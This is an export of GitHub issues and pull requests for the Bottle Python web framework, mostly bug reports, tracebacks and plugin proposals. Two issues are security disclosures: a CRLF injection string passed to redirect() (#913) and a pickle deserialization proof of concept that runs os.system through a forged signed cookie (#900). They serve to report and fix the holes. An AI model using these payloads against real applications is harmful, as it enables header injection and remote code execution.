- unconverted RST shortlinks:
  - http://bottlepy.org/docs/dev/deployment.html: apache
  - http://bottlepy.org/docs/dev/tutorial.html: http_code, WSGIspecification"
924,that should fix #922,2017-01-09T15:13:25Z,2017-06-09T19:08:34Z,,,,
923,TypeError WSGI response header value u'...' is not of type str,2017-01-09T11:16:13Z,2017-01-09T12:47:34Z,Bug,TypeError,"TypeError: WSGI response header value u'text/plain' is not of type str.","The fix for #913 introduced new type checks on headers which causes failure when existing code like this:
```
#!/usr/bin/env python
# coding=utf-8
import bottle
@bottle.route('/', method='GET')
def test():
    return bottle.static_file('test.txt', root='.', mimetype=u'text/plain', download='test.txt')
bottle.BaseRequest.MEMFILE_MAX = 5 * 1024 * 1024
bottle.debug(True)
bottle.run(host='127.0.0.1', port=8080, reloader=True, server='cherrypy')
```
is run with python 2.7 

This used to work, now it shows this error in chromium:
```
""The requested resource returned more bytes than the declared Content-Length.""
```

The actual trace as shown in the console where the script runs is:
```
Critical error while processing request: /
Error:
TypeError(""WSGI response header value u'text/plain' is not of type str."",)
Traceback:
Traceback (most recent call last):
  File ""/usr/lib/python2.7/dist-packages/bottle.py"", line 960, in wsgi
    start_response(response._status_line, response.headerlist)
  File ""/usr/lib/python2.7/dist-packages/cherrypy/wsgiserver/wsgiserver2.py"", line 2309, in start_response
    ""WSGI response header value %r is not of type str."" % v)
TypeError: WSGI response header value u'text/plain' is not of type str.
```

The workaround is to pass a string not a unicode string as mimetype:
```
    return bottle.static_file('test.txt', root='.', mimetype='text/plain', download='test.txt')
```

At a minimum, it would be preferable to see the `""Critical error while processing request""` error not the `""The requested resource returned more bytes than the declared Content-Length.""` one which is misleading.

For maximum backward compatibility, and if that does not cause side-effects, it would be nice if unicode strings would be OK as they used to be."
922,The wget installation to wget http://bottlepy.org/bottle.py raise 404 error,2017-01-08T15:33:17Z,2017-01-19T11:40:40Z,,,,When following the tutorial wget wget http://bottlepy.org/bottle.py installation we get a 404.
921,Minor: 'Listening on http://...' even when in SSL mode,2017-01-06T16:59:17Z,,,,,"Hi!
More an annoyance than an issue: Bottle always states @ line 3112
`_stderr(""Listening on http://%s:%d/\n"" % (server.host, server.port))`
which is correct in most cases - yet wrong when operating in SSL mode; it then should say
`Listening on https:// ... `.

Perhaps you're in the mood to fix anytime.
Best regards, Ralph"
920,Added to new Plugins,2017-01-05T14:47:53Z,2017-06-09T18:30:29Z,,,,"- bottle-jwt: JSON Web Token authentication plugin for bottle.py
- bottle-smart-filters: Bottle Querystring smart guessing."
919,Receiving a code other than 2xx generate exception,2017-01-05T12:27:23Z,2017-06-09T18:31:46Z,,,,"expect_errors=True not generate exception for ""bad requests"" ( status != 200)
I have checked /logout only with number"
918,AttributeError: 'FileUpload' object has no attribute 'get_header',2017-01-05T03:01:54Z,2017-01-06T12:07:13Z,,AttributeError,"AttributeError: 'FileUpload' object has no attribute 'get_header'","```
    content_type = upload.content_type
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 1423, in __get__
    value = obj.get_header(self.name, self.default)
AttributeError: 'FileUpload' object has no attribute 'get_header'
```
From a different reporter:
http://stackoverflow.com/questions/21840723/devpi-attributeerror-fileupload-object-has-no-attribute-value-when-up"
917,New plugins proposal,2017-01-04T12:24:39Z,2017-01-04T13:16:01Z,,,,"I have created two new plugins:

## Bottle-errorsrest:
returns all errors in json format (even those generated with HTTPError)

## Bottle-cerberus:
Integrates cerberus schemas into bottle decorators"
916,Proposal to update the list of plugins.,2017-01-01T13:17:50Z,2017-01-01T15:17:33Z,,,,"I have made a proposal to update the list of plugins.
"
915,Problems using 2 plugins that modify the arguments,2016-12-29T17:19:46Z,2016-12-29T18:41:30Z,,TypeError,"TypeError: test_cerberus() missing 1 required positional argument: 'schema'","I am creating a new plugin for bottle but I already had some assets in the project and I have encountered an error.

I put a sample code that reproduces the error

```python
from bottle import install, run, get
from functools import wraps
import inspect


class CerberusPlugin(object):
    name = 'CerberusPlugin'
    api = 2
    keyword = 'schema'

    def apply(self, callback, route):
        schema = route.config.get(self.keyword, None)
        if not schema:
            return route.callback

        @wraps(callback)
        def wrapper(*args, **kwargs):
            if inspect.signature(callback).parameters.get(self.keyword):
                kwargs[self.keyword] = schema
            # TODO: functionality not implemented
            return route.callback(*args, **kwargs)
        return wrapper


class CerberusPlugin2(object):
    name = 'CerberusPlugin2'
    api = 2
    keyword = 'schema2'

    def apply(self, callback, route):
        schema = route.config.get(self.keyword, None)
        if not schema:
            return route.callback

        @wraps(callback)
        def wrapper(*args, **kwargs):
            if inspect.signature(callback).parameters.get(self.keyword):
                kwargs[self.keyword] = schema
            # TODO: functionality not implemented
            return route.callback(*args, **kwargs)
        return wrapper



install(CerberusPlugin())
install(CerberusPlugin2())

@get('/cerberus', schema={'test': {'type': 'string'}})
def test_cerberus(schema):
    print(schema)
    return ""guay""

run()
```

error:
``` python
Bottle v0.12.11 server starting up (using WSGIRefServer())...
Listening on http://127.0.0.1:8080/
Hit Ctrl-C to quit.

Traceback (most recent call last):
  File ""/usr/local/bin/bottle.py"", line 862, in _handle
    return route.call(**args)
  File ""/usr/local/bin/bottle.py"", line 1740, in wrapper
    rv = callback(*a, **ka)
TypeError: test_cerberus() missing 1 required positional argument: 'schema'
127.0.0.1 - - [29/Dec/2016 18:32:58] ""GET /cerberus HTTP/1.1"" 500 749
```

 if I do not install the plugin ""CerberusPlugin"" works correctly

bottle version: 0.12.11

I am doing something wrong? Thank you!"
914,Assertion on Non-ASCII HeaderDict keys when run with Python 2.x ,2016-12-11T13:48:16Z,,,,,"[Python asserts that header names are StringType](https://github.com/python/cpython/blob/b6f258d2a7b22df78ae30ebe2b7910d8d65bb918/Lib/wsgiref/handlers.py#L179), which crashes the code whenever unicode strings are used directly as keys in python 2.x, or when someone uses `unicode_literals` from `__future__` in their python 2/3 compatible code.

Reproducible sample:
```
from __future__ import unicode_literals
import bottle


@bottle.route('/')
def index():
    bottle.response.headers['Content-Encoding'] = ''
    return ''

if __name__ == '__main__':
    bottle.run()

```

possible solution could be normalizing the key returned from [`_hkey`](https://github.com/bottlepy/bottle/blob/f936dfaa7ca43551ba63d9a7b4b2a9a62ab9c0fb/bottle.py#L1586)
```
return str(s.title()).replace('_', '-')
```
"
913,"redirect() doesn't filter ""\r\n"" leads to CRLF attack",2016-12-08T07:29:24Z,2016-12-17T20:58:37Z,Accepted,,,"Hi,

`redirect()` doesn't filter ""\r\n"" which leads to CRLF attack.

For example, I use `redirect(""233\r\nSet-Cookie: name=salt"")` can set a new cookie in the client side.

:P"
912,Fixed issue #911,2016-12-08T05:26:13Z,2016-12-08T15:52:55Z,,,,"Changed __hook_reversed into set.

Set literal is chosen (over list, tuple) because:
1. It is supported since python 2.7, which is the
   lowest version of python supported by bottle
   right now.
2. Set membership testing is fast.
3. Duplicates prevented."
911,Logical error in add_hook and __hook_reversed,2016-12-08T05:20:51Z,2016-12-08T17:37:06Z,,,,"As of [492985f4 in line 671](https://github.com/bottlepy/bottle/blob/492985f46318b2051bba6f427cdf4889397b10d5/bottle.py#L671):

```python
    __hook_reversed = 'after_request'
```
Hooks that are supposed to be called in reversed order should be in some sort of collection. It is set as a single string right now, which works as intended by pure accident, as in [line 688](https://github.com/bottlepy/bottle/blob/492985f46318b2051bba6f427cdf4889397b10d5/bottle.py#L688):
```python
        if name in self.__hook_reversed:
```
Here we are checking sub-string instead, it works because ```""after_request""``` is a sub-string of itself, but anything shorter will work, e.g:
```python
>>> 'after_request' in 'after_request'
True
>>> 'af' in 'after_request'
True
>>> 'a' in 'after_request'
True
```"
910,"Can not use global instance ""response"" to set_header, set_cookie and etc",2016-12-07T08:32:06Z,2016-12-07T16:09:03Z,,,,"As following code, I use global instance ""response"" to set a HTTP header ""test_header"" and set a cookie.
But it does not work.
```python
from bottle import route, run, template, HTTPResponse, response, Bottle

@route('/hello/<name>')
def index(name):
	response.set_header('test_header', 'abc123')
	response.set_cookie('cccook', name, 'mysecret', path='/')
	resp = HTTPResponse('<b>Hello %s</b>!' % name)
	return resp

run(host='localhost', port=9999)
```

![pic1](https://cloud.githubusercontent.com/assets/4166753/20959771/b934ffc6-bc97-11e6-8530-1a38ac994d78.jpg)

Is the set_header and set_cookie method can not be used as above?
**I found some things in the code made me confused.**

---
In bottle.py, about `line 1891`, the defined of HTTPResponse:
```python
class HTTPResponse(Response, BottleException):
    def __init__(self, body='', status=None, headers=None, **more_headers):
        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)

    def apply(self, other):
        other._status_code = self._status_code
        other._status_line = self._status_line
        other._headers = self._headers
        other._cookies = self._cookies
        other.body = self.body
```

In the ""apply"" method, why use the attributes(_status_code, _status_line, _headers, _cookies) of self are assigned to the other instance (other.xx <- self.xx)? Is it correct? Should not be turned over assignment (self.xx <- other.xx)?

I tried to modify the code of bottle.py to verify my idea, change the ""apply"" method to:
```python
    def apply(self, other):
        self._status_code = other._status_code
        self._status_line = other._status_line
        self._headers = other._headers
        self._cookies = other._cookies
        self.body = other.body
```
Get the result:
![2222](https://cloud.githubusercontent.com/assets/4166753/20960199/3be65bca-bc9a-11e6-93cd-e1aeeaf7ddb1.png)
The result is correct.

I'm not sure if the changes I make affect the entire framework code.
Please confirm, thanks.
"
909,Request/response timeout,2016-12-02T22:30:50Z,2016-12-04T17:15:13Z,,,,"Good day!

How do I set a timeout for request? Seems like Bottle is blocked in read forever if needed:
```
 - - [02/Dec/2016 11:36:37] ""GET http://httpheader.net/ HTTP/1.1"" 404 765
^C----------------------------------------
Exception happened during processing of request from ('89.248.172.90', 57776)
Traceback (most recent call last):
  File ""/usr/lib/python3.5/socketserver.py"", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""/usr/lib/python3.5/socketserver.py"", line 341, in process_request
    self.finish_request(request, client_address)
  File ""/usr/lib/python3.5/socketserver.py"", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""/usr/lib/python3.5/socketserver.py"", line 681, in __init__
    self.handle()
  File ""/usr/lib/python3.5/wsgiref/simple_server.py"", line 119, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File ""/usr/lib/python3.5/socket.py"", line 575, in readinto
    return self._sock.recv_into(b)
KeyboardInterrupt
----------------------------------------
 - - [03/Dec/2016 01:18:59] code 400, message Bad request syntax ('\x05\x01\x00')
```

Thanks."
908,Router _compile slows down as number of routes increases,2016-11-15T01:46:01Z,,,,,"First of all, thanks for all your hard work on this project! I found an interesting case and I'd like to share what I've seen so far.

I'm doing some optimization on our startup process and found that about 80% of its time is spent in time performing regexes as we add routes. I'm running Bottle 0.12.9 currently. For example, here's a CProfile view of the app's startup:

```
   9635437 function calls (9357673 primitive calls) in 24.589 seconds

   Ordered by: cumulative time


   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    0.032    0.032   24.613   24.613 mainapp.py:1(<module>)
        1    0.083    0.083   23.689   23.689 app.py:1(<module>)
     2772    0.060    0.000   20.429    0.007 re.py:230(_compile)
     1229    0.006    0.000   20.410    0.017 re.py:192(compile)
      974    0.013    0.000   20.365    0.021 sre_compile.py:567(compile)
      672    0.010    0.000   20.095    0.030 bottle.py:806(decorator)
      719    0.005    0.000   20.057    0.028 bottle.py:769(add_route)
      719    0.020    0.000   20.051    0.028 bottle.py:318(add)
      387    0.015    0.000   19.581    0.051 bottle.py:388(_compile)
  983/982    0.010    0.000   12.834    0.013 sre_parse.py:686(parse)
39555/983    0.364    0.000   12.808    0.013 sre_parse.py:310(_parse_sub)
55442/16488    2.980    0.000   12.588    0.001 sre_parse.py:388(_parse)
       13    0.000    0.000   11.212    0.862 appbase.py:105(__init__)
       15    0.002    0.000   11.212    0.747 appbase.py:111(register)
```

After tracing the application, I've found the root cause of the issue. Each time a route is added to the Bottle router, it recompiles *all* routes seen so far for that method. In one case, we had about ~200 GET methods, so it was performing 200 GET compiles - one each time a route was added. Here's the relevant lines in the Bottle source:

https://github.com/bottlepy/bottle/blob/master/bottle.py#L439
https://github.com/bottlepy/bottle/blob/master/bottle.py#L441

The workaround I found is to comment out the `_compile` call while I'm still adding lines and then, once I've added every route I'm planning to use, I can iterate over the methods in the router's `self.dyna_routes` and call `router._compile(method)` myself. In my CProfile testing, it yielded about a 5x speed improvement for launching the app. Here's a CProfile for time spent starting the app afterward:

```
   1474497 function calls (1439451 primitive calls) in 5.290 seconds

   Ordered by: cumulative time

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    0.010    0.010    5.306    5.306 mainapp.py:1(<module>)
        1    0.060    0.060    4.113    4.113 app.py:1(<module>)
       74    0.061    0.001    3.592    0.049 __init__.py:1(<module>)
        4    0.011    0.003    2.941    0.735 views.py:1(<module>)
        7    0.020    0.003    2.857    0.408 apiviews.py:1(<module>)
        2    0.010    0.005    2.811    1.406 tasks.py:1(<module>)
     2294    0.012    0.000    1.286    0.001 re.py:230(_compile)
      606    0.007    0.000    1.273    0.002 sre_compile.py:567(compile)
      751    0.003    0.000    1.270    0.002 re.py:192(compile)
```

Similarly, outside of CProfile, I see an improvement of about 2-3x on startup time.

Before: 

```
real    0m3.499s
user    0m2.748s
sys     0m0.392s
```

After:

```
real    0m1.911s
user    0m1.188s
sys     0m0.380s
```"
907,Fixed Flup webpage link,2016-11-14T11:58:40Z,2016-11-14T12:41:26Z,,,,Flup webpage link was broken (outdated) in the tutorial.
906,Add greenlet/gevent support without monkey-patching.,2016-11-12T09:18:56Z,,,,,"Bottle relies on `threading.local` for request-local storage to enable the module globals `request` and `response` objects to work properly.  This is used in `LocalRequest` and `LocalResponse` and implemented in `_local_property()`. 

In #896 @kianxineki ran into a problem when he used `meinheld`, a greenlet based server implementation, and triggered a greenlet context switch while a request was still in progress. This caused the greenlet based server to start processing a new request _in the same thread_, overwriting the thread-local properties of the old request with new data, and thus breaking the old request context while it is still being used.

Unfortunately, there is no standard way to detect libraries that change the concept of _locality_. `gevent` offers a solution via `event.monkey.patch_all()`, which also patches `threading.local` and therefor `_local_property()`. `meinheld` does not offer such a patching mechanism.

Currently, there is no easy way to change the behavior of `_local_property()`. Since `threading.local` is way faster than any pure-python implementation could be, it should remain the default, but an alternative implementation should be provided to users who which to utilize greenlet based IO and concurrency.

    import bottle, greenlet
    bottle.patch_context_id(greenlet.getcurrent)

"
905,Fetching _body multiple times in POST request fails second time.,2016-11-11T12:10:51Z,,,,,"In the docs for `request.body` it says:
``Subsequent accesses just do a `seek(0)` on the file object.``

However, the whole code for `_body` is run each time — for example using `.POST` or `.files`.  The second call ends up with a file object that has 0 size.

Shouldn't `_body` be a cached property?"
904,Socket connection pending without timeout,2016-10-26T08:17:45Z,2016-10-26T09:09:40Z,,,,"My `bottle` application (an API service)  is randomly hanging (about every ~10 to 20 days, calls to it are done every minute) and I finally connected `gdb` to a hung session yesterday. `py-list` shows

```
(gdb) py-list
 366            self._checkReadable()
 367            if self._timeout_occurred:
 368                raise OSError(""cannot read from timed out object"")
 369            while True:
 370                try:
>371                    return self._sock.recv_into(b)
 372                except timeout:
 373                    self._timeout_occurred = True
 374                    raise
 375                except InterruptedError:
 376                    continue
```

The script is hung here (`cont` and `Ctrl-C` brings it back to the same place). 

The traceback:

```
(gdb) py-bt
Traceback (most recent call first):
  File ""/usr/lib/python3.4/socket.py"", line 371, in readinto
    return self._sock.recv_into(b)
  File ""/usr/lib/python3.4/wsgiref/simple_server.py"", line 118, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File ""/usr/lib/python3.4/socketserver.py"", line 669, in __init__
    self.handle()
  File ""/usr/lib/python3.4/socketserver.py"", line 344, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File ""/usr/lib/python3.4/socketserver.py"", line 331, in process_request
    self.finish_request(request, client_address)
  File ""/usr/lib/python3.4/socketserver.py"", line 305, in _handle_request_noblock
    self.process_request(request, client_address)
  File ""/usr/lib/python3.4/socketserver.py"", line 238, in serve_forever
    self._handle_request_noblock()
  File ""/usr/lib/python3/dist-packages/bottle.py"", line 2769, in run
    srv.serve_forever()
  File ""/usr/lib/python3/dist-packages/bottle.py"", line 3114, in run
    server.run(app)
  File ""webserver.py"", line 510, in __init__
  File ""webserver.py"", line 547, in <module>
```

I initially thought that the problem was with `request` but it is not. I am not sure that it is even with `bottle` but I do not have enough experience to statute on that. Feel free to close the issue if it is not related.
"
903,Flush wsgi.errors,2016-10-19T09:14:04Z,2016-10-19T10:59:21Z,,,,"Some wsgi servers buffers `wsgi.errors` and error messages does not appear in logs. To fix that, after writing to `wsgi.errors` it should be flushed in order for content to be written to the file.

See: https://github.com/unbit/uwsgi/issues/1222
"
902,No wheel for latest version 0.12.10,2016-10-16T10:13:32Z,2016-10-16T16:50:23Z,,,,"This project has `bdist_wheel` configuration in its `setup.cfg` but no wheel has been published. This implies that the `bdist_wheel` step was missed in release. A full sdist + bdist_wheel release can be done with `python setup.py clean sdist bdist_wheel upload`. You can also upload the wheel right now by checking out the source code at the version for the last release and running `python setup.py clean bdist_wheel upload`. This will speed up everyone's installs 🐇 😄
"
901,FormsDict do not provide function as doc describe,2016-10-14T07:00:02Z,2016-10-15T07:33:56Z,,,,"doc said 
`this container also supports attribute-like access to its values.`

ok, let say ask for `/hello?key=value`

you can get it by `request.params.key`, that is very pythonic then `request.params['key']`. i like it so much.

but did you the origin method you cannot replace it, such as `/hello?items=value`, you can not get items, you will find it is a function.

that make no sense, only confuse.any ideas?
"
900,Deserialization security issues when using signed cookies ,2016-10-13T12:00:40Z,,Accepted,,,"Hi,

during a pentest of a Bottlepy based application, I've noticed that when using signed cookies, `cookie_decode` is being called:

``` .python
def cookie_decode(data, key, digestmod=None):
      """""" Verify and decode an encoded string. Return an object or None.""""""
      data = tob(data)
      if cookie_is_encoded(data):
          sig, msg = data.split(tob('?'), 1)
          digestmod = digestmod or hashlib.sha256
          hashed = hmac.new(tob(key), msg, digestmod=digestmod).digest()
          if _lscmp(sig[1:], base64.b64encode(hashed)):
              return pickle.loads(base64.b64decode(msg))
      return None 
```

When the hash value of the cookie data is valid, `pickle.loads()` gets involved. An attacker could therefore build a cookie value like this:

``` .python
[...]

secret_key = ""your secret key""

# --- Exploit class to be serialized
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('ls',))

def build_exploit():
    digestmod = hashlib.sha256
    msg = base64.b64encode(cPickle.dumps(Exploit()))
    hashed = hmac.new(tob(secret_key), msg, digestmod=digestmod).digest()
    return ""!%s?%s"" % (base64.b64encode(hashed), msg)
```

In this case `build_exploit()` will return a base64 encoded serialized string (hash value + serialized class) which will trigger the execution of `os.system(""ls"")` when being deserialized (`pickle.loads()`). 

> You can of course use this kind of attack **only** when you know the secret key used for the signing process. 

You should definitely avoid using `cPickle` and use some JSON based alternatives for the serialization job. 

Best regards,
Victor 
"
899,Static file multithreading,2016-10-08T23:38:12Z,2016-10-19T11:55:36Z,,,,"Context: When I use `bottle.run(..., server='cherrypy')`, I run it in
multi-threaded mode. This results in two requests sharing the same
environment.
They serve the old file with 200 in this case.
Fix: Getting the header from the request object first, makes the actual
request being used and not the request that runs in parallel.
Evaluation: This results in a performance improvement in this scenario,
since one more file is reported as not modified.
"
898,Add an option to use a custom http parser,2016-09-29T17:59:43Z,2016-09-30T09:52:24Z,,,,"I know a readble pure python http parser is good, but its also nice to have a custom http parser option :)
"
897,0.12.9 plugins are not compatible with 1.13-dev,2016-09-27T09:50:41Z,2016-09-27T10:32:05Z,,,,"``` python
from bottle import install, run
from functools import wraps


class ExamplePlugin(object):
    name = 'ExamplePlugin'
    api = 2

    def setup(self, app):
        pass

    def apply(self, callback, route):
        @wraps(route.callback)
        def wrapper(*args, **kwargs):
            return route.callback(*args, **kwargs)
        return wrapper


install(ExamplePlugin())
run()
```
"
896,different behavior using the server meinheld,2016-09-26T09:05:23Z,2016-11-12T14:54:19Z,,,,"Gevent and meinheld are behaving differently, I think the right would be to meinheld according to the description of the class,  I do not even look like the most comfortable.

https://github.com/bottlepy/bottle/blob/master/bottle.py#L1865
    """""" A thread-local subclass of :class:`BaseResponse` with a different
        set of attributes for each thread. There is usually only one global
        instance of this class (:data:`response`). Its attributes are used
        to build the HTTP response at the end of the request/response cycle.""""""

Gevent test:

``` python
from gevent import monkey; monkey.patch_all()
from bottle import post, request, run
import requests


@post('/ok/<correct>')
def ok(correct):
    print(""[0] value: %s correct value: %s"" % (request.json['number'], correct))
    requests.post(""http://httpbin.org/post"", json={'number': 99})
    print(""[1] value: %s correct value: %s"" % (request.json['number'], correct))


@post('/test')
def test():
    pass
run(host='0.0.0.0', port=9988, server='gevent')
```

```
[0] value: 0 correct value: 0
[0] value: 2 correct value: 2
[0] value: 3 correct value: 3
[0] value: 4 correct value: 4
[0] value: 5 correct value: 5
[0] value: 6 correct value: 6
[0] value: 7 correct value: 7
[0] value: 1 correct value: 1
[0] value: 9 correct value: 9
[0] value: 8 correct value: 8
[1] value: 6 correct value: 6
[1] value: 0 correct value: 0
[1] value: 2 correct value: 2
[1] value: 3 correct value: 3
[1] value: 4 correct value: 4
[1] value: 5 correct value: 5
[1] value: 9 correct value: 9
[1] value: 8 correct value: 8
[1] value: 7 correct value: 7
[1] value: 1 correct value: 1
```

meinheld test:

``` python
from meinheld import patch
patch.patch_all()
from bottle import post, request, run
import requests


@post('/ok/<correct>')
def ok(correct):
    print(""[0] value: %s correct value: %s"" % (request.json['number'], correct))
    requests.post(""http://httpbin.org/post"", json={'number': 99})
    print(""[1] value: %s correct value: %s"" % (request.json['number'], correct))


run(host='0.0.0.0', port=9988, server='meinheld')
```

```
[0] value: 0 correct value: 0
[0] value: 1 correct value: 1
[0] value: 3 correct value: 3
[0] value: 5 correct value: 5
[0] value: 2 correct value: 2
[0] value: 6 correct value: 6
[0] value: 4 correct value: 4
[0] value: 7 correct value: 7
[0] value: 8 correct value: 8
[0] value: 9 correct value: 9
[1] value: 9 correct value: 0
[1] value: 9 correct value: 7
[1] value: 9 correct value: 1
[1] value: 9 correct value: 5
[1] value: 9 correct value: 2
[1] value: 9 correct value: 6
[1] value: 9 correct value: 3
[1] value: 9 correct value: 4
[1] value: 9 correct value: 8
[1] value: 9 correct value: 9
```

test:

``` python
import requests
import threading


def call(number):
    print(""call %s"" % number)
    requests.post('http://localhost:9988/ok/%s' % number,
                  json={'number': number})


threads = []
for x in range(10):
    t = threading.Thread(target=call, args=(x, ))
    t.start()
    threads.append(t)

for x in threads:
    x.join()

```
"
895,Add badge for CircleCI,2016-09-25T14:13:46Z,2016-09-25T15:05:29Z,,,," and update Python 3.x version, since CircleCI is now active ... You can show off with a badge.
"
894,Handle unprintable errors,2016-09-21T21:39:56Z,2016-09-24T10:12:54Z,,,,"Previously, these would throw another error and obliterate the useful traceback, replacing it with a useless one
"
893,Fix tracebacks that would contain <string> to contain the template path,2016-09-21T19:32:13Z,2016-09-24T10:15:14Z,,,,"It seems that using `eval(compile(...))` throws away the name that we gave the `code` object. We don't use the return value of `eval` anyway, so `exec` is fine.
"
892,raise HTTPResponse not working correctly,2016-09-20T12:07:38Z,2016-09-24T10:32:07Z,,,,"does not return the same results by making ""raise"" and ""return""

``` python
from bottle import run, get, HTTPResponse


@get('/test1')
def test1():
    return HTTPResponse({'test': 'ko'}, 402)

@get('/test2')
def test2():
    raise HTTPResponse({'test': 'ko2'}, 402)

run(host='0.0.0.0', port=9988)
```

bottle 0.12.9 results:

```
In [1]: import requests

In [2]: r = requests.get('http://localhost:9988/test1')

In [3]: r.text, r.headers['content-type']
Out[3]: ('{""test"": ""ko""}', 'application/json')

In [4]: r = requests.get('http://localhost:9988/test2')

In [5]: r.text, r.headers['content-type']
Out[5]: ('test', 'text/html; charset=UTF-8')

```

patch results:

```
In [1]: import requests

In [2]: r = requests.get('http://localhost:9988/test1')

In [3]: r.text, r.headers['content-type']
Out[3]: ('{""test"": ""ko""}', 'application/json')

In [4]: r = requests.get('http://localhost:9988/test2')

In [5]: r.text, r.headers['content-type']
Out[5]: ('{""test"": ""ko2""}', 'application/json')

```
"
891,Tests randomly fail with Python 3.5,2016-09-09T19:56:54Z,2016-09-24T10:45:35Z,,AssertionError,AssertionError: ERROR:waitress:Unexpected exception when flushing,"I don't understand why tests fail randomly with Python 3.5 on Travis. Restarting the build made the tests pass. 

```
======================================================================

FAIL: test_simple (test_server.TestServerAdapter_auto)

Test a simple static page with this server adapter.

----------------------------------------------------------------------

Traceback (most recent call last):

  File ""/home/travis/build/oz123/bottle/test/test_server.py"", line 86, in tearDown

    raise AssertionError(line.strip().decode('utf8'))

AssertionError: ERROR:waitress:Unexpected exception when flushing

----------------------------------------------------------------------

Ran 337 tests in 12.567s

FAILED (failures=1)

sys:1: ResourceWarning: unclosed file <_io.BufferedReader name=7>

sys:1: ResourceWarning: unclosed file <_io.BufferedReader name=5>
```
"
890,Drop opt parser,2016-09-09T19:03:10Z,2016-09-12T14:28:34Z,,,,"Another tiny pull request ... 
"
889,Fix warning about using absolute template path names,2016-09-09T08:50:20Z,2016-09-24T10:10:37Z,,,,"Fixes #888.
"
888,Using Jinja2Template produces deprecation warnings,2016-09-09T08:48:06Z,2016-09-24T10:10:37Z,,,,"Using code like this

``` python
@app.get('/hello')
def hello():
    return template('hello.html', template_adapter=bottle.Jinja2Template)
```

causes a deprecation warning to be emitted:

```
.../bottle.py:3325: DeprecationWarning: Absolute template path names are deprecated.
  fname = self.search(name, self.lookup)
```
"
887,Add support for custom tplid for template caching,2016-09-07T13:51:58Z,,,,,"I'm using [bottle-i18n](https://pypi.python.org/pypi/bottle-i18n) together with Jinja templates. In order to get full `jinja2.ext.i18n` support I have a bit customized code:

``` python
import gettext

import bottle
import bottle.ext.i18n


class I18NPlugin(bottle.ext.i18n.I18NPlugin):

    def prepare(self, *args, **kwargs):
        super().prepare(*args, **kwargs)
        translations = self._cache.get(self._lang_code) or gettext.NullTranslations()
        for app in self._apps:
            app.translations = translations


class Jinja2Template(bottle.Jinja2Template):
    settings = {
        'autoescape': True,
        'extensions': ['jinja2.ext.i18n'],
    }

    def loader(self, name):
        self.env.install_gettext_translations(bottle.request.app.translations)
        return super().loader(name)
```

But since templates are cached, `self.env.install_gettext_translations(bottle.request.app.translations)` is called only for a first request, other requests with different language gets same cached templates and language for templates stays the same as before.

In order to be able to fix that it would be great to have `template_id` parameter in `bottle.template`, this could look something like this:

``` python
def template(*args, **kwargs):
    '''
    Get a rendered template as a string iterator.
    You can use a name, a filename or a template string as first parameter.
    Template rendering arguments can be passed as dictionaries
    or directly (as keyword arguments).
    '''
    tpl = args[0] if args else None
    adapter = kwargs.pop('template_adapter', SimpleTemplate)
    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
    template_id = kwargs.pop('template_id', lambda lookup, tpl: (id(lookup), tpl))
    tplid = template_id(lookup, tpl)
    if tplid not in TEMPLATES or DEBUG:
        settings = kwargs.pop('template_settings', {})
        if isinstance(tpl, adapter):
            TEMPLATES[tplid] = tpl
            if settings: TEMPLATES[tplid].prepare(**settings)
        elif ""\n"" in tpl or ""{"" in tpl or ""%"" in tpl or '$' in tpl:
            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
        else:
            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
    if not TEMPLATES[tplid]:
        abort(500, 'Template (%s) not found' % tpl)
    for dictarg in args[1:]: kwargs.update(dictarg)
    return TEMPLATES[tplid].render(kwargs)
```

Then I could solve multilanguage support like this:

``` python
template = functools.partial(
    bottle.template,
    template_adapter=Jinja2Template,
    template_id=lambda lookup, tpl: (id(lookup), tpl, request.app.lang),
)
```
"
886,Permission to use Bottle's logo on DevDocs,2016-09-05T20:10:06Z,2016-09-05T20:58:01Z,,,,"Hi

https://github.com/Thibaut/devdocs/pull/459 adds Bottle's documentation to DevDocs (http://devdocs.io). Are you OK with the logo being part of DevDocs? 

Thanks
"
885,Enable coveralls,2016-09-03T05:41:46Z,2016-09-05T11:06:45Z,,,,"@defnull, coveralls is now enabled on my fork. Never the less the badge is ready for the main repo.
I think you need to login once into coveralls.io with your github account and enable the repo there, 
and then the badge will show the coverage for bottle.py.
"
884,Re enable coverage,2016-09-02T16:14:25Z,2016-09-02T18:09:02Z,,,,"Enable coverage reporting and collection in coveralls.
"
883,Tiny update to cached_property,2016-09-02T16:13:49Z,2016-09-02T17:32:49Z,,,," Use update_wrapper, such that the information in the wrapper is more
 complete. Similar to reify in pyramid.
"
882,catchall does not work with templates,2016-09-01T09:37:42Z,2016-09-24T11:16:45Z,,,,"Here is a simple test:

``` python
def test_bottle():
    import bottle
    import webtest

    app = bottle.app()
    app.catchall = False

    @bottle.route('/hello/<name>')
    def hello(name):
        return bottle.template('hello_template', name=name)

    testapp = webtest.TestApp(app)
    testapp.get('/hello/world')
```

Here I expect to get full traceback, since `app.catchall` is `False`, but instead I get 500 error without possibility to see original traceback.

Related: https://github.com/bottlepy/bottle/issues/167
"
881,the autojson can't correctly handle chinese,2016-09-01T03:55:18Z,,Request,,,"whatever the response.charset or the charset of response.content_type I set, the chinese characters are always converted to unicode characters.
so I  can only turn of the autojson, and output the json string by myself.
json.dumps(<dict_to_convert>, ensure_ascii=True) performs like the autojson(unicode)
json.dumps(<dict_to_convert>, ensure_ascii=False) is what i want.(bytestring)
maybe bottle needs to provide a choose. 
"
880,Add documentation for ConfigDict.load_module,2016-08-30T14:34:51Z,2016-08-30T20:57:15Z,,,," Fix #772
"
879,Fix wrong and annd tiny style changes,2016-08-30T13:54:19Z,2016-08-30T20:54:36Z,,,,
878,Remove workaround missing keyword `as`,2016-08-29T05:14:31Z,2016-08-29T12:52:09Z,,,,"All supported Python versions include the `as` keyword

https://hg.python.org/cpython/file/3.{2,3,4,5}/Lib/keyword.py.
"
